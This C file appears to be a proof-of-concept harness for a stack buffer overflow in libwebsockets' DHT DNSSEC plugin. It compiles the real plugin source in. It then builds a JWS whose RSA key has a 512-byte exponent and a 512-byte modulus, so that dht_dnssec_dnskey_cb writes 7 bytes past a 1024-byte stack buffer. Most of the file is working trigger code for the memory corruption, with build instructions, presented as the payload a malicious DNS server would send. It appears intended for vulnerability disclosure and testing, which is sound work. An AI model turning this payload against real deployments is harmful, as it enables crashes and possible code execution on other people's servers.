/*
 * PoC for stack overflow in DNSSEC DNSKEY key construction
 * (protocol_lws_dht_dnssec.c:655-698)
 *
 * This harness compiles the REAL plugin source code via:
 *   -include protocol_lws_dht_dnssec.c
 *
 * Attack scenario: a malicious DNS server returns a DNSKEY record
 * containing a JWS with an embedded RSA JWK whose exponent (E) and
 * modulus (N) are both 512 bytes (the maximum lws_jwk_import allows
 * per element). The plugin copies both into key_data[1024] with a
 * 4+3=7 byte header, totaling 1031 bytes - 7 bytes past the buffer.
 *
 * Build (requires libwebsockets built with -DLWS_WITH_JOSE=ON):
 *
 *   gcc -fsanitize=address,undefined -fno-omit-frame-pointer \
 *     -I<lws_build>/include -I<lws_src>/include \
 *     -I<lws_src>/plugins/protocol_lws_dht_dnssec \
 *     -include protocol_lws_dht_dnssec.c \
 *     -Wno-unused-function \
 *     poc_dnssec_key_overflow.c \
 *     -L<lws_build>/lib -lwebsockets \
 *     -lssl -lcrypto -lpthread -lm -luv -l:libcap.so.2 \
 *     -o poc_dnssec_key_overflow
 *
 * Usage: ./poc_dnssec_key_overflow
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/stat.h>
#include <unistd.h>

static int
b64url_encode(const uint8_t *in, int in_len, char *out, int out_max)
{
	static const char t[] =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
	int i, o = 0;

	for (i = 0; i + 2 < in_len; i += 3) {
		if (o + 4 > out_max) return -1;
		out[o++] = t[(in[i] >> 2) & 0x3f];
		out[o++] = t[((in[i] & 3) << 4) | (in[i+1] >> 4)];
		out[o++] = t[((in[i+1] & 0xf) << 2) | (in[i+2] >> 6)];
		out[o++] = t[in[i+2] & 0x3f];
	}
	if (i < in_len) {
		if (o + 4 > out_max) return -1;
		out[o++] = t[(in[i] >> 2) & 0x3f];
		if (i + 1 < in_len) {
			out[o++] = t[((in[i] & 3) << 4) | (in[i+1] >> 4)];
			out[o++] = t[(in[i+1] & 0xf) << 2];
		} else {
			out[o++] = t[(in[i] & 3) << 4];
		}
	}

	return o;
}

/*
 * Create a JWS compact serialization file with an RSA JWK containing
 * oversized E and N components. Each element is at most 512 bytes
 * (passes lws_jwk_import's per-element limit), but combined they
 * exceed key_data[1024].
 */
static int
create_jws_file(const char *path, int e_size, int n_size)
{
	FILE *fp;
	uint8_t *e_raw, *n_raw;
	char *e_b64, *n_b64, *header_json, *header_b64;
	int e_b64_len, n_b64_len, hdr_json_len, hdr_b64_len;

	e_raw = malloc((size_t)e_size);
	n_raw = malloc((size_t)n_size);
	if (!e_raw || !n_raw) { free(e_raw); free(n_raw); return -1; }

	e_raw[0] = 0x01;
	for (int i = 1; i < e_size; i++) e_raw[i] = 0x01;
	n_raw[0] = 0x01;
	for (int i = 1; i < n_size; i++) n_raw[i] = (uint8_t)(0xBB ^ (i & 0xFF));

	e_b64 = malloc((size_t)(e_size * 2));
	n_b64 = malloc((size_t)(n_size * 2));
	e_b64_len = b64url_encode(e_raw, e_size, e_b64, e_size * 2);
	n_b64_len = b64url_encode(n_raw, n_size, n_b64, n_size * 2);
	if (e_b64_len < 0 || n_b64_len < 0) goto fail;

	header_json = malloc((size_t)(e_b64_len + n_b64_len + 256));
	hdr_json_len = snprintf(header_json, (size_t)(e_b64_len + n_b64_len + 256),
		"{\"alg\":\"RS256\",\"jwk\":{\"kty\":\"RSA\","
		"\"e\":\"%.*s\",\"n\":\"%.*s\"}}",
		e_b64_len, e_b64, n_b64_len, n_b64);

	header_b64 = malloc((size_t)(hdr_json_len * 2));
	hdr_b64_len = b64url_encode((const uint8_t *)header_json,
				    hdr_json_len, header_b64,
				    hdr_json_len * 2);
	if (hdr_b64_len < 0) goto fail;

	fp = fopen(path, "w");
	if (!fp) goto fail;

	fwrite(header_b64, 1, (size_t)hdr_b64_len, fp);
	fputc('.', fp);
	fputs("e30", fp);
	fputc('.', fp);
	fputs("AA", fp);
	fclose(fp);

	fprintf(stderr, "[*] Created JWS: %s\n", path);
	fprintf(stderr, "    RSA exponent (E): %d bytes\n", e_size);
	fprintf(stderr, "    RSA modulus  (N): %d bytes\n", n_size);

	free(e_raw); free(n_raw);
	free(e_b64); free(n_b64);
	free(header_json); free(header_b64);
	return 0;

fail:
	free(e_raw); free(n_raw);
	free(e_b64); free(n_b64);
	return -1;
}

int
main(void)
{
	/*
	 * lws_jwk_import() accepts up to 512 bytes per RSA element
	 * (LWS_JWE_LIMIT_KEY_ELEMENT_BYTES = LWS_JWE_LIMIT_RSA_KEY_BITS/8 = 512).
	 *
	 * With E=512 and N=512, the plugin constructs:
	 *   key_data[1024] layout:
	 *     [0..3]    4 bytes  flags(2) + protocol(1) + algorithm(1)
	 *     [4..6]    3 bytes  E length prefix (E>255 -> 3-byte encoding)
	 *     [7..518]  512 bytes  RSA exponent
	 *     [519..1030] 512 bytes  RSA modulus  <- OVERFLOW at byte 1024
	 *
	 *   Total: 4 + 3 + 512 + 512 = 1031 bytes into 1024-byte buffer
	 *   Overflow: 7 bytes past key_data[1024]
	 */
	int e_size = 512, n_size = 512;
	int total = 4 + 3 + e_size + n_size;  /* 3-byte E prefix since E>255 */
	int overflow = total - 1024;
	char tmpdir[] = "/tmp/poc_dnssec_XXXXXX";
	char jws_path[512];
	char tmp_subdir[512];

	fprintf(stderr,
		"╔════════════════════════════════════════════════════════╗\n"
		"║  DNSSEC DNSKEY Stack Overflow PoC                      ║\n"
		"║  plugin: protocol_lws_dht_dnssec.c:655-698             ║\n"
		"║  function: dht_dnssec_dnskey_cb() - REAL PLUGIN CODE   ║\n"
		"║  JWK parsing: lws_jwk_import() - REAL LWS API          ║\n"
		"╚════════════════════════════════════════════════════════╝\n\n");

	fprintf(stderr, "[*] RSA E=%d bytes, N=%d bytes (each ≤512 = per-element limit)\n",
		e_size, n_size);
	fprintf(stderr, "[*] key_data: 4+3+%d+%d = %d bytes into 1024-byte buffer\n",
		e_size, n_size, total);
	fprintf(stderr, "[*] Overflow: %d bytes\n\n", overflow);

	if (!mkdtemp(tmpdir)) {
		perror("mkdtemp");
		return 1;
	}
	snprintf(tmp_subdir, sizeof(tmp_subdir), "%s/tmp", tmpdir);
	mkdir(tmp_subdir, 0755);
	snprintf(jws_path, sizeof(jws_path), "%s/tmp/testhash.DEADBEEF", tmpdir);

	if (create_jws_file(jws_path, e_size, n_size) < 0) {
		fprintf(stderr, "[-] Failed to create JWS file\n");
		return 1;
	}

	struct vhd_dht_dnssec vhd;
	struct dht_fragment frag;
	memset(&vhd, 0, sizeof(vhd));
	memset(&frag, 0, sizeof(frag));

	vhd.storage_path = tmpdir;
	frag.vhd = &vhd;
	strncpy(frag.safe_hash, "testhash", sizeof(frag.safe_hash) - 1);
	frag.temp_token = 0xDEADBEEF;
	strncpy(frag.domain, "example.com", sizeof(frag.domain) - 1);
	frag.algo = 8;          /* RSASHA256 */
	frag.digest_type = 2;   /* SHA-256 */
	frag.ds_digest_len = 0;
	frag.fd = -1;

	fprintf(stderr, "[*] Calling REAL dht_dnssec_dnskey_cb()...\n");
	fprintf(stderr, "    Plugin source: protocol_lws_dht_dnssec.c (compiled in)\n");
	fprintf(stderr, "    JWK parsed by: lws_jwk_import() (real libwebsockets)\n");
	fprintf(stderr, "    Expect: stack-buffer-overflow at memcpy(key_data+key_len, n_buf, n_len)\n\n");
	fflush(stderr);

	dht_dnssec_dnskey_cb(NULL, "example.com", NULL, 0, &frag);

	fprintf(stderr, "[!] Returned without crash\n");

	unlink(jws_path);
	rmdir(tmp_subdir);
	rmdir(tmpdir);

	return 0;
}
